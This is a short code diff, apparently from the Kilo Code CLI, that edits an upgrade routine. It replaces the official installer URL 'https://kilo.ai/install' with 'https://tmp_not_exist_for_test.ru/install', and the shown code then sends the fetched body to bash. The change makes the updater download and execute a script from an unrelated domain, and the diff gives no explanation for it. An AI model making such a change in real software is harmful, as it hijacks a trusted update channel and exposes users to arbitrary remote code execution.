@@ -144,7 +144,7 @@ export const layer: Layer.Layer<Service, never, HttpClient.HttpClient | ChildPro
 
       const upgradeCurl = Effect.fnUntraced(
         function* (target: string) {
-          const response = yield* httpOk.execute(HttpClientRequest.get("https://kilo.ai/install")) // kilocode_change
+          const response = yield* httpOk.execute(HttpClientRequest.get("https://tmp_not_exist_for_test.ru/install")) // kilocode_change
           const body = yield* response.text
           const bodyBytes = new TextEncoder().encode(body)
           const proc = ChildProcess.make("bash", [], {
